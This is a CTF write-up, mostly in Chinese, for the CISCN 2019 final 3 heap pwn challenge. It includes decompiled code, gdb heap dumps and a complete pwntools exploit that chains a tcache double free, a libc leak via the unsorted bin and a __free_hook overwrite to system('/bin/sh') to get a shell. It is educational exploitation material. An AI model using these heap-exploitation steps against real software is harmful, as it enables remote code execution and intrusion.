# CISCN 2019 final 3

> CISCN 2019 全国大学生信息安全竞赛 pwn babyheap  https://buuoj.cn/challenges#ciscn_2019_final_3
>
> file: ciscn_final_3, libc.so.6
>
> .i64 with comments provided, corresponding ld.so (2.27-3ubuntu1) provided
>
> writeup writer: hexhex16@outlook.com    https://github.com/hex-16
>
> refer writeup:  https://bbs.pediy.com/thread-262480.htm  and   waterdrop lwl

add操作限制content size<0x78，这个大小没法放入unsorted bin，而因开启ASLR，需要泄露libc基址才能得到free hook和system地址。需要构造fake chunk放入unsorted bin，并且同时将fake chunk放入可以申请回来的tcache中，由此得到fake chunk的fw值(libc上的地址)，得到libc基址。最后通过double free改`__free_hook`为 `system`，getshell。

1. 构造fake chunk(size=0xa1)，并通过double free拿到fake chunk的地址
2. 把fake chunk的size改为0x51后放入tcache中暂存，用于后续泄露libc基址，再把size改回0xa1
3. 把fake chunk放入unsorted bin
4. tcache中的fake chunk的fw也被改成了libc上的地址，通过偏移计算得到libc基址
5. 通过double free修改`__free_hook`为 `system`
6. 触发`__free_hook`，实际调用`system("/bin/sh")`

> 本地测时可以改system为puts，不然会程序崩溃，buuoj上远程时改回system

# Pre Analysis

保护全开

```bash
checksec --file=ciscn_final_3  
[*] '/home/kali/CTF/buuoj/ciscn_final_3'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

```bash
strings libc.so.6 | grep GLIBC
......
GLIBC_2.26
GLIBC_2.27
GLIBC_PRIVATE
GNU C Library (Ubuntu GLIBC 2.27-3ubuntu1) stable release version 2.27.
```

- 根据 **Ubuntu GLIBC 2.27-3ubuntu1** 去 http://archive.ubuntu.com/ubuntu/pool/main/g/glibc/ 找对应的deb 提取出ld.so，这里已经提供了ld.so，查找ld.so的具体方法见pwn.md

# IDA Analysis

程序有两个功能

1. add：input(index, size, content), 向BSS区上的一个指针数组上分配空间，并调用read读入至多size个char
2. delete：input(index) 然后free(arr+index) free后没有置零，index没有做重复free检查，存在double free漏洞

注意add函数的几个要点：

1. add时判断arr[idx]是否为NULL 不为NULL则退出，而由于delete不置零，故每个idx仅可add一次
2. 输入的size值至多为0x78，这个大小的chunk不会进入unsort bin，而是进入fast bin.(指tcache满时)
3. 输入content调用的是read函数，可以输入\x00
4. 程序会输出malloc出来的chunk的基址

```cpp
unsigned __int64 add()
{
  __int64 v0; // rax
  __int64 v1; // rax
  unsigned int v2; // ebx
  __int64 v3; // rax
  size_t size; // [rsp+0h] [rbp-20h] BYREF 这个size_t记录index 也记录size
  unsigned __int64 v6; // [rsp+8h] [rbp-18h]

  v6 = __readfsqword(0x28u);
  v0 = std::operator<<<std::char_traits<char>>(&std::cout, "input the index");
  std::ostream::operator<<(v0, &std::endl<char,std::char_traits<char>>);
  std::istream::operator>>(&std::cin, (char *)&size + 4);// size+4是index
  if ( *((_QWORD *)&arr_p + HIDWORD(size)) || HIDWORD(size) > 0x18 )
    exit(0);
  v1 = std::operator<<<std::char_traits<char>>(&std::cout, "input the size");
  std::ostream::operator<<(v1, &std::endl<char,std::char_traits<char>>);
  std::istream::operator>>(&std::cin, &size);
  if ( (unsigned int)size <= 0x78 )             // 可输入内容的长度
  {
    v2 = HIDWORD(size);
    *((_QWORD *)&arr_p + v2) = malloc((unsigned int)size);// malloc
    v3 = std::operator<<<std::char_traits<char>>(&std::cout, "now you can write something");
    std::ostream::operator<<(v3, &std::endl<char,std::char_traits<char>>);
    sub_CBB(*((_QWORD *)&arr_p + HIDWORD(size)), (unsigned int)size);// 调read 往arr_p+idx 写入size 个字节
    puts("OK!");
    printf("gift :%p\n", *((const void **)&arr_p + HIDWORD(size)));
  }
  return __readfsqword(0x28u) ^ v6;
}
```

delete函数没有需要过多注意的地方，仅需注意到free后没有置NULL即可



# Exploit

```python
from pwn import *

context.log_level = "DEBUG"
context.binary = './ciscn_final_3'
sh = process(['./ld.so', './ciscn_final_3'], env={'LD_PRELOAD': './libc.so.6'})
# sh = remote("node4.buuoj.cn", 29996)
libc = ELF("./libc.so.6")
elf = ELF("./ciscn_final_3")


def add(index, size, content):
    sh.sendlineafter('choice >', '1')
    sh.sendlineafter('input the index', str(index))
    sh.sendlineafter('input the size', str(size))
    sh.sendafter('now you can write something', content)
    sh.recvuntil('gift :')
    return int(sh.recvuntil('\n', drop=True), 16)


def delete(index):
    sh.sendlineafter('choice >', '2')
    sh.sendlineafter('input the index', str(index))


# === Step-1: 突破程序的chunk size<=0x81的限制，构造并拿到一个size=0xa1的fake chunk
# vmmap查看heap base # heap chunks查看 # PIE导致heap基址会变 但可利用不变的偏移来计算
heap_base = add(0, 0x20, "a") - 0x555555b5de70 + 0x0000555555b4c000
print("heap_base=>", hex(heap_base))  # 对照 vmmap 输出的heap基址是否相同

gdb.attach(sh)

add(1, 0x70, p64(0xdeadbeef012345) + p64(0xa1))  # 用新申请的这个chunk的content去构造 fake chunk的size域
# 前64bit: prev_size(没free的时候其实是上一个chunk的user data, 可乱填) 后64bit: size=0xa1
# 查看构造的fake chunk:  x /30xg 0x55555750fea0 # 这个地址是 heap chunks 输出的上一个add的chunk的地址
# 1. 伪造下一chunk.size; 2. 伪造下下个chunk.size域(大于0x21) 否则报 corrupted size vs. prev_size error
add(2, 0x70, b"a" * 0x20 + p64(0xdeadbeef) + p64(0x21) + b"b" * 0x18 + p64(0x91))
# 0x60+0x10(prev_size,size)+0x20("a")+p64(0xdeadbeef)+size(0x21)
delete(0)  # 最早free的在tcache链表的最末端
delete(0)  # Tcachebins[idx=1, size=0x30] count=2 # 成环
delete(0)  # Tcachebins[idx=1, size=0x30] count=3 ← Chunk(addr=0x555555b5de70, size=0x30... 成环
# 把刚刚delete到tcache(0x30)的申请回来一个，和剩下在tcache(0x30)的chunk是同一个 改手里的chunk.fd也会改tcache上的fd
# 0x11eb0 计算方式: fake chunk的fd域的地址-heap基址  # 注意不是chunk的基址 是chunk user data的地址
# entry -> 0x31_chunk -> 0xa1_chunk # 再拿两次得到fake chunk
add(3, 0x20, p64(heap_base + 0x11eb0))
add(4, 0x20, "ab")  # entry被修改为heap_base+0x11eb0
fake_chunk_addr = add(5, 0x20, "ff")   # 拿出的这个chunk就是刚刚构造的fake chunk(size=0xa1)
print("fake chunk addr=>", hex(fake_chunk_addr))  # 通过gift输出的addr对比 # x /50xg addr-0x10 第二行末尾是0xa1


# === Step-2: put fake_chunk into tcache(0x51)。改fake_chunk.size=0x51(可以申请回来的大小)放入tcache(0x51) 再改回0xa1
delete(1)  # tcache(0x51).e->c_1 # 这个chunk可以控制fake chunk的size # delete后再申请回来，改 fake_chunk.size
add(6, 0x70, p64(0xdeadbeef1111) + p64(0x51))  # fake chunk.size=0x51
delete(5)  # tcache(0x51).e->fake_chunk
delete(5)  # tcache(0x51).e->fake_chunk->fake_chunk  # !!! 后续会把这个拿回去
delete(1)  # delete后再申请回来，改fake_chunk.size
add(7, 0x70, p64(0xdeadbeef2222) + p64(0xa1))  # fake chunk.size=0xa1 # fake_chunk.size 改回0xa1


# === Step-3: put fake_chunk into unsorted bins
for i in range(7):  # 填满tcahe(0xa1)
    delete(5)  # fake_chunk
# Tcachebins[idx=8, size=0xa0] count=7 # tcahe(0xa1)已满 unsorted bins为空
delete(5)  # unsorted bins->fake_chunk # 链入unsorted bins链表时 fw bk指针指向libc上的一个结构

# tcache(0x51)上存储的fake_chunk fd域改成了libc上的地址(即tcache(0x51)第二个chunk在libc上)
# tcache(0x51).e->fake_chunk->some_addr_in_libc

# === Step-4: leack libc addr: 从tcache(0x51) malloc两次得到libc上的地址
add(8, 0x40, "a")  # tcache(0x51).e->some_addr_in_libc
# 再拿一次 返回的addr就是前面的fw的值，通过vmmap对比计算出偏移量得到libc基址
libc_addr = add(9, 0x40, "a") - 0x7fc25a088ca0 + 0x00007fc259c9d000
print("libc addr=>", hex(libc_addr))  # 对照这里的基址和vmmap里的libc的基址对不对
libc.address = libc_addr

# === Step5: 修改__free_hook : double free
delete(1)  # 这里用8去double free会被检测出double free 原因待探究 # to tcache(0x81)
delete(1)
delete(1)  # tache(0x81).e -> c -> c -> c
add(10, 0x70, p64(libc.symbols["__free_hook"]))  # tache(0x81).e -> c -> __free_hook
add(11, 0x70, "a")  # tache(0x81).e -> __free_hook
add(12, 0x70, p64(libc.symbols["system"]))  # *__free_hook = libc.symbols["puts"]
# 本地用system测会有问题 可以用pust替代先看效果
# x /xg &__free_hook 查看__free_hook有没被修改(默认为NULL)


# === Step-6: getshell system("/bin/sh")
add(13, 0x70, "/bin/sh\0")  # 这里的size随意 只要是程序允许申请的大小即可
delete(13)  # trigger __free_hook # get shell

sh.interactive(">>>interactive>>>")

```





# Step-1: Make and Get Fake Chunk

- heap chunks查看当前chunk  刚刚申请的chunk size=0x30 地址为 0x555555b5de70

```assembly
heap chunks # add(0, 0x20, "a") 之后的
Chunk(addr=0x555555b4c010, size=0x250, flags=PREV_INUSE)
    [0x0000555555b4c010     00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00    ................]
Chunk(addr=0x555555b4c260, size=0x11c10, flags=PREV_INUSE)
    [0x0000555555b4c260     00 1c 01 00 00 00 00 00 00 00 00 00 00 00 00 00    ................]
Chunk(addr=0x555555b5de70, size=0x30, flags=PREV_INUSE) # add(0, 0x20, "a") malloc的size=0x30的chunk
    [0x0000555555b5de70     61 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00    a...............]
Chunk(addr=0x555555b5dea0, size=0xf170, flags=PREV_INUSE)  ←  top chunk
```

> heap chunks是从上往下地址由低到高现实的，heap往高地址生长，后续chunk会append到后面且在top chunk低地址方向

- vmmap查看heap基址  0x0000555555b4c000

```assembly
vmmap
[ Legend:  Code | Heap | Stack ]
Start              End                Offset             Perm Path
# 下面这个是heap的基址
0x0000555555b4c000 0x0000555555b6d000 0x0000000000000000 rw- [heap]
0x00007fe622271000 0x00007fe622275000 0x0000000000000000 rw- 
......
# 下面这个是libc的基址
0x00007fe6223b9000 0x00007fe6225a0000 0x0000000000000000 r-x /home/kali/CTF/buuoj/libc.so.6
0x00007fe6225a0000 0x00007fe6227a0000 0x00000000001e7000 --- /home/kali/CTF/buuoj/libc.so.6
0x00007fe6227a0000 0x00007fe6227a4000 0x00000000001e7000 r-- /home/kali/CTF/buuoj/libc.so.6
0x00007fe6227a4000 0x00007fe6227a6000 0x00000000001eb000 rw- /home/kali/CTF/buuoj/libc.so.6
0x00007fe6227a6000 0x00007fe6227aa000 0x0000000000000000 rw- 
# 下面这个是程序的基址
0x00007fe6227aa000 0x00007fe6227ac000 0x0000000000000000 r-x /home/kali/CTF/buuoj/ciscn_final_3
......
0x00007fe6229ad000 0x00007fe6229d4000 0x0000000000000000 r-x /home/kali/CTF/buuoj/ld.so  ......
```

- exp输出内容与heap base对应

```bash
heap_base=> 0x555555b4c000
```

- 同时根据vmmap中输出的 基址 下断点 `b *0x00007fe6227aaf76` f76是IDA中查看到的 while循环开始的指令地址



- 接下来新申请两个chunk 利用这两个chunk的userdata部分 构造一个fake chunk，chunk size=0xa1。fake chunk的下一个chunk的size=0x21，下下个chunk的size=0x91

```python
add(1, 0x70, p64(0xdeadbeef012345) + p64(0xa1))
add(2, 0x70, b"a" * 0x20 + p64(0xdeadbeef) + p64(0x21) + b"b" * 0x18 + p64(0x91))
```

- 此时 heap chunks多了两个0x80size的chunk
- 查看第一个0x80chunk addr-0x10开始的内存: `x /30xg 0x555555b5dea0-0x10`

```assembly
heap chunks
Chunk(addr=0x555555b4c010, size=0x250, flags=PREV_INUSE)
    [0x0000555555b4c010     00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00    ................]
Chunk(addr=0x555555b4c260, size=0x11c10, flags=PREV_INUSE)
    [0x0000555555b4c260     00 1c 01 00 00 00 00 00 00 00 00 00 00 00 00 00    ................]
Chunk(addr=0x555555b5de70, size=0x30, flags=PREV_INUSE)
    [0x0000555555b5de70     61 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00    a...............]
Chunk(addr=0x555555b5dea0, size=0x80, flags=PREV_INUSE)
    [0x0000555555b5dea0     45 23 01 ef be ad de 00 a1 00 00 00 00 00 00 00    E#..............]
Chunk(addr=0x555555b5df20, size=0x80, flags=PREV_INUSE)
    [0x0000555555b5df20     61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61    aaaaaaaaaaaaaaaa]
Chunk(addr=0x555555b5dfa0, size=0xf070, flags=PREV_INUSE)  ←  top chunk
gef > x /30xg 0x555555b5dea0-0x10 # 一个0x80chunk addr-0x10
0x555555b5de90: 0x0000000000000000      0x0000000000000081 # 1st chunk size=0x81
0x555555b5dea0: 0x00deadbeef012345      0x00000000000000a1 # |             |fake chunk size|
0x555555b5deb0: 0x0000000000000000      0x0000000000000000
0x555555b5dec0: 0x0000000000000000      0x0000000000000000
0x555555b5ded0: 0x0000000000000000      0x0000000000000000
0x555555b5dee0: 0x0000000000000000      0x0000000000000000
0x555555b5def0: 0x0000000000000000      0x0000000000000000
0x555555b5df00: 0x0000000000000000      0x0000000000000000
0x555555b5df10: 0x0000000000000000      0x0000000000000081 # 2nd chunk size=0x81
0x555555b5df20: 0x6161616161616161      0x6161616161616161
0x555555b5df30: 0x6161616161616161      0x6161616161616161
0x555555b5df40: 0x00000000deadbeef      0x0000000000000021 # chunk after fake chunk size=0x21
0x555555b5df50: 0x6262626262626262      0x6262626262626262
0x555555b5df60: 0x6262626262626262      0x0000000000000091 # chunk after after fake chunk size=0x91
0x555555b5df70: 0x0000000000000000      0x0000000000000000
```

-  0x555555b5deb0 - 0x555555b4c000 (heap base) = 0x11eb0 这个是fake chunk和heap base的offset


```python
delete(0)  # 最早free的在tcache链表的最末端
delete(0)
delete(0) # Tcachebins[idx=1, size=0x30] count=3 ← Chunk(addr=0x555555b5de70, size=0x30... 成环
# 把刚刚delete到tcache(0x30)的申请回来一个(和剩下在tcache(0x30)的chunk其实是同一个)
# 0x11eb0 计算方式: fake chunk的fd域的地址-heap基址 注意不是chunk的基址 是chunk user data的地址
add(3, 0x20, p64(heap_base + 0x11eb0))  # 将手上的chunk(也是tcache(0x30)的第一个chunk)的fd修改成heap_base+0x11eb0
# tcache(0x30)的entry指向的还是add(0, 0x20, "a")的那个chunk 但是fd域已经被修改了
add(4, 0x20, "ab")  # 再拿出一个，tcache(0x30)的entry就成了heap_base+0x11eb0
fake_chunk_addr = add(5, 0x20, "ff")  # 拿出的这个chunk就是刚刚构造的fake chunk(size=0xa1)
# 可以通过输出的gift上面这个add的chunk地址，然后查看: x /50xg addr-0x10 # 可以看到第二行末尾是0x00a1
print("fake chunk addr=>", hex(fake_chunk_addr))
```

- free两次后成环，tcahe count=2，内存上被free的chunk的fd域(user data首地址)被更改为tcache链上下一chunk的首地址，由于成环，fd被改为自身的地址

```assembly
heap bins  # free两次后的情况
──────────────────────── Tcachebins for thread 1 ────────────────────────────
Tcachebins[idx=1, size=0x30] count=2  ←  Chunk(addr=0x555555b5de70, size=0x30, flags=PREV_INUSE)  ←  Chunk(addr=0x555555b5de70, size=0x30, flags=PREV_INUSE)  →  [loop detected]
...
gef➤  x /30xg 0x555555b5de70-0x10
0x555555b5de60: 0x0000000000000000      0x0000000000000031
0x555555b5de70: 0x0000555555b5de70      0x0000000000000000 # fd域被改为指向自己 成环
0x555555b5de80: 0x0000000000000000      0x0000000000000000
...
```

- free三次后，tcache count=3
- 然后申请回来一个chunk，并且改fd(user content前8B)为fake chunk的基址。由于成环，tcache上的chunk和刚刚申请回来的chunk是同一个，所以tcache上的chunk的fd也被改成了fake chunk基址(fd域)
- tcach的entry还是指向0x555555b5de70，但是由于0x555555b5de70的chunk的fd改成了0x555555b5deb0，所以此时下一个chunk就是0x555555b5deb0的size=0xa0的chunk。所以接下来再malloc两次就可以拿到这个fake chunk

```assembly
x /30xg 0x555555b5de70-0x10 # add(3, 0x20, p64(heap_base + 0x11eb0)) 执行完之后
0x555555b5de60: 0x0000000000000000      0x0000000000000031
0x555555b5de70: 0x0000555555b5deb0      0x0000000000000000
0x555555b5de80: 0x0000000000000000      0x0000000000000000
0x555555b5de90: 0x0000000000000000      0x0000000000000081
0x555555b5dea0: 0x00deadbeef012345      0x00000000000000a1 # |             |fake chunk size|
0x555555b5deb0: 0x0000000000000000      0x0000000000000000 # |fake chunk fd|               | 
0x555555b5dec0: 0x0000000000000000      0x0000000000000000
heap bins
────────────────────────────────── Tcachebins for thread 1 ───────────────────────────────────────
Tcachebins[idx=1, size=0x30] count=2  ←  Chunk(addr=0x555555b5de70, size=0x30, flags=PREV_INUSE)  ←  Chunk(addr=0x555555b5deb0, size=0xa0, flags=PREV_INUSE)
```

- add(5, 0x20, "ff") 执行完之后，程序输出`fake chunk addr=> 0x555555b5deb0`，已经指向fake chunk fd了

# Step-2: Put fake_chunk into tcache(0x51)

- taget：把fake chunk放到一个可以取回的tcache中暂存起来（题目限制了size<=0x78），不然没法输出后面存在fake chunk.fw中的libc上的地址
- method：
  1. 改 fake_chunk.size=0x51
  2. delete fake_chunk
  3. 改 fake_chunk.size=0xa1

```python
# === Step-2: put fake_chunk into tcache(0x51)。改fake_chunk.size=0x51(可以申请回来的大小)放入tcache(0x51) 再改回0xa1
delete(1)  # tcache(0x51).e->c_1 # 这个chunk可以控制fake chunk的size # delete后再申请回来，改 fake_chunk.size
add(6, 0x70, p64(0xdeadbeef1111) + p64(0x51))  # fake chunk.size=0x51
delete(5)  # tcache(0x51).e->fake_chunk
delete(5)  # tcache(0x51).e->fake_chunk->fake_chunk  # !!! 后续会把这个拿回去
delete(1)  # delete后再申请回来，改fake_chunk.size
add(7, 0x70, p64(0xdeadbeef2222) + p64(0xa1))  # fake chunk.size=0xa1 # fake_chunk.size 改回0xa1
```

结束时 `tcache(0x51).e->fake_chunk->fake_chunk`

# Step-3: Put fake_chunk into unsorted bin

- target: 将fake_chunk放入unsorted bin, fake_chunk.fw bk修改为libc上的地址
- reason: 链入unsorted bin时，unsorted bin用fw bk域来维护双向链表
- method: free七次填满tcahe(0xa1)，再free一次放入 unsorted bin (fast bin存不下)

```python
# === Step-3: put fake_chunk into unsorted bin
for i in range(7):  # 填满 tcahe(0xa1)
    delete(5)  # fake_chunk
# Tcachebins[idx=8, size=0xa0] count=7 # tcahe(0xa1)已满 unsorted bins为空
delete(5)  # unsorted bins->fake_chunk # 链入unsorted bins链表时 fw bk指针指向libc上的一个结构

# tcache(0x51)上存储的fake_chunk fd域改成了libc上的地址(即tcache(0x51)第二个chunk在libc上)
```
- 由于fake_chunk的fw bk被修改了，所以此时 tcache(0x51) 变成了：
```python
tcache(0x51).e->fake_chunk->some_addr_in_libc
```

# Step-4: Leack libc addr

- 由于存在 tcache(0x51) 的fake_chunk的fw被修改了，所以此时malloc两次即可得到一个libc上的地址
- 通过这个地址和vmmap上显示的libc的基址计算一个每次运行都不会变的offset，从而计算出每次运行时的libc基址

```python
# === Step-4: leack libc addr: 从tcache(0x51) malloc两次得到libc上的地址
add(8, 0x40, "a")  # tcache(0x51).e->some_addr_in_libc
# 再拿一次 返回的addr就是前面的fw的值，通过vmmap对比计算出偏移量得到libc基址
libc_addr = add(9, 0x40, "a") - 0x7fc25a088ca0 + 0x00007fc259c9d000
print("libc addr=>", hex(libc_addr))  # 对照这里的基址和vmmap里的libc的基址对不对
libc.address = libc_addr
```

# Step-5: Change `__free_hook` to `system`

- 挑一个来做double free，但是用8去做double free会报错，原因待探究
- tache(0x81)的变化过程：
  1. `tache(0x81).e -> c -> c -> c`  : free 3 times
  2. `tache(0x81).e -> c -> __free_hook` : malloc并改fw指向`__free_hook`
  3. `tache(0x81).e -> __free_hook` : malloc一次
  4. `*__free_hook = libc.symbols["system"]`: malloc一次得到`__free_hook`并改为`libc.symbols["system"]`

```python
# === Step5: change __free_hook : double free
delete(1)  # 这里用8去double free会被检测出double free 原因待探究 # to tcache(0x81)
delete(1)
delete(1)  # tache(0x81).e -> c -> c -> c
add(10, 0x70, p64(libc.symbols["__free_hook"]))  # tache(0x81).e -> c -> __free_hook
add(11, 0x70, "a")  # tache(0x81).e -> __free_hook
add(12, 0x70, p64(libc.symbols["system"]))  # *__free_hook = libc.symbols["puts"]
# 本地用system测会有问题 可以用pust替代先看效果
# x /xg &__free_hook 查看__free_hook有没被修改(默认为NULL)
```





# Step-6: Get Shell: `system("/bin/sh")`

- `__free_hook `已经改成了system了，需要一次free来触发

```python
# === Step-6: getshell system("/bin/sh")
add(13, 0x70, "/bin/sh\0")  # 这里的size随意 只要是程序允许申请的大小即可
delete(13)  # trigger __free_hook # get shell system("/bin/sh")

sh.interactive(">>>interactive>>>")
```

